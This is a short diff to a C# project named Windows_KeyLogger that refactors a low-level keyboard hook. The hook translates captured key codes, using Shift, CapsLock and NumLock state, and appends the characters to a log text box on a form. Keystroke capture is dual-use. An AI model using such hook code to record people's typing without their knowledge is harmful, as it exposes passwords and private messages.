@@ -132,9 +132,6 @@ namespace Windows_KeyLogger
             {
                 Keys key = (Keys)lparam.vkCode;
 
-                //if (_hookedKeys.Contains(key))
-                //{
-                    
                 KeyEventArgs args = new KeyEventArgs(key);
 
                 bool NumLock = (((ushort)GetKeyState(0x90)) & 0xffff) != 0;
@@ -151,39 +148,15 @@ namespace Windows_KeyLogger
                 }
                 else if(form.dicLower.ContainsKey(key))
                 {
-                    if(Shift)
-                    {
-                        form.richLog.AppendText(form.dicUpper[key]);
-                      
+                    if(Shift ^ CapsLock)
+                    { //capital alphabet 
+                        form.richLog.AppendText(form.dicLower[key].ToUpper());
                     }else
-                    {
-                        if(CapsLock)
-                            form.richLog.AppendText(form.dicLower[key].ToUpper());
-                        else
-                            form.richLog.AppendText(form.dicLower[key]);
+                    { //small alphabet
+                        form.richLog.AppendText(form.dicLower[key]);
                     }
                 }
-                    
-
-                    //if ((wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) && (KeyDown != null))
-                    //{
-                    //    _hookedKeyStates[key] = true;
-                    //    KeyDown(this, args);
-                     
-                    //}
-                    //else if ((wparam == WM_KEYUP || wparam == WM_SYSKEYUP) && (KeyUp != null))
-                    //{
-                    //    _hookedKeyStates[key] = false;
-                    //    KeyUp(this, args);
-                    //}
-
-                    //if (args.Handled)
-                    //{
-                    //    return 1;
-                    //}
-                //}
             }
-
             return CallNextHookEx(_hook, code, wparam, ref lparam);
         }
     }
